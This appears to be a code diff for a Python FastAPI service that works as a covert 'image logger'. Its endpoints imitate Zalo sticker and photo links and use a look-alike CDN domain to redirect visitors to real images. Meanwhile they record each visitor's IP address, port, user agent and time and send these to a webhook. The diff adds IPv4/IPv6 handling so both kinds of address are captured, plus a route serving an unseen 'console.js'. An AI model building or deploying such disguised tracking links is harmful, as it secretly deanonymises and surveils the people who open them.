@@ -15,6 +15,7 @@ from jose import JWTError, jwt
 from app.database import SessionLocal
 from fastapi.responses import RedirectResponse
 import base64
+import ipaddress
 # from dotenv import load_dotenv
 import os
 import app.model as model
@@ -65,7 +66,6 @@ async def db_session_middleware(request: Request, call_next):
 @app.middleware("http")
 async def log_ip(request: Request, call_next):
     ip = request.headers['x-real-ip']
-    # ip= '123.18.143.95'
     port= request.client.port
     timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))
     request.state.ip = ip
@@ -75,8 +75,16 @@ async def log_ip(request: Request, call_next):
     return response
 
 '''
+Check ip
+'''
+@app.get("/items/")
+def read_root( request: Request):
+    client_host = request.client.host
+    return {"client_host": client_host, "item_id": 0}
+'''
 Root route and logger ip to database
 '''
+
 @app.get("/api/{urlpath}/{imagename}")
 async def redirect_image(background_tasks: BackgroundTasks,request: Request, urlpath: str,token: str = None, user_agent: str = Header(None, convert_underscores=True), imagename: str = None, db: Session = Depends(get_db) ):
     ip = request.state.ip
@@ -93,34 +101,101 @@ async def redirect_image(background_tasks: BackgroundTasks,request: Request, url
 Redirect parse link
 '''
 @app.get("/photolinkv2/720/{token}/{base64url}")
-async def redirect_parselink(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = 'parse link', base64url: str = None, size: int =130 ,db: Session = Depends(get_db) ):
+async def redirect_parlink(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = 'parse link', base64url: str = None, size: int =130 ,db: Session = Depends(get_db) ):
     ip = request.state.ip
     timestamp = request.state.timestamp
     port = request.state.port
-    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
-    decoded_bytes = base64.b64decode(base64url)
-    decoded_url = decoded_bytes.decode('utf-8')
-    if not curd.check_ip_exist(ip, db=db):
-        if  not eid or token==None or not curd.check_exists_token(db, token=token):
-            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Cảnh báo server configuration',db=db)
-            return RedirectResponse(decoded_url)
-        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Image Logger', db=db)
-    return RedirectResponse(decoded_url)
+    try: 
+        ipv6 = ipaddress.IPv6Address(ip)
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        decoded_bytes = base64.b64decode(base64url)
+        decoded_url = decoded_bytes.decode('utf-8')
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(decoded_url)
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Image Logger', db=db)
+        return RedirectResponse(f"https://c.z-image-cdn.com/v4/photolinkv2/720/{token}/{base64url}")
+    except:
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        decoded_bytes = base64.b64decode(base64url)
+        decoded_url = decoded_bytes.decode('utf-8')
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(decoded_url)
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Image Logger', db=db)
+        return RedirectResponse(decoded_url)
+
+
+
+'''
+ipv6 redirect
+'''
+@app.get("/v4/photolinkv2/720/{token}/{base64url}")
+async def redirect_parlink(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = 'parse link', base64url: str = None, size: int =130 ,db: Session = Depends(get_db) ):
+    ip = request.state.ip
+    timestamp = request.state.timestamp
+    port = request.state.port
+    try:
+        ipv4 = ipaddress.IPv4Address(ip)
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        decoded_bytes = base64.b64decode(base64url)
+        decoded_url = decoded_bytes.decode('utf-8')
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(decoded_url)
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Image Logger', db=db)
+        return RedirectResponse(decoded_url)
+    except:
+        pass
+
 '''
 Redirect emotion sticker
+'''
+@app.get("/v4/emoticon/sticker/webpc")
+async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
+    ip = request.state.ip
+    timestamp = request.state.timestamp
+    port = request.state.port
+    try: 
+        ipv4 = ipaddress.IPv4Address(ip)
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
+        return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")
+    except:
+        pass
+
+'''
+Test ipv6 redirect
 '''
 @app.get("/emoticon/sticker/webpc")
 async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
     ip = request.state.ip
     timestamp = request.state.timestamp
     port = request.state.port
-    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
-    if not curd.check_ip_exist(ip, db=db):
-        if  not eid or token==None or not curd.check_exists_token(db, token=token):
-            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
-            return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
-        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
-    return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")
+    try:
+        ipv6 = ipaddress.IPv6Address(ip)
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
+        return RedirectResponse(f"https://c.z-image-cdn.com/v4/emoticon/sticker/webpc?eid={eid}&size={size}&token={token}")
+    except:
+        webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+        if not curd.check_ip_exist(ip, db=db):
+            if  not eid or token==None or not curd.check_exists_token(db, token=token):
+                background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
+                return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
+            background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
+        return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")
 
 '''
 Voice url get
@@ -193,6 +268,15 @@ async def read_item(filename: str, q: str = None):
         return FileResponse(f'{uri_path}/taylor.gif', media_type="image/gif")
     return FileResponse(image_path, media_type="image/gif")
 
+@app.get("/jsfile/console.js")
+async def read_file():
+    file_path = f"{uri_path}/console.js"  # Update this with the actual path
+    try:
+        with open(file_path, "rb") as file:
+            contents = file.read()
+        return FileResponse(file_path)
+    except FileNotFoundError:
+        return {"error": "File not found"}
 '''
 View Image with logger database
 '''
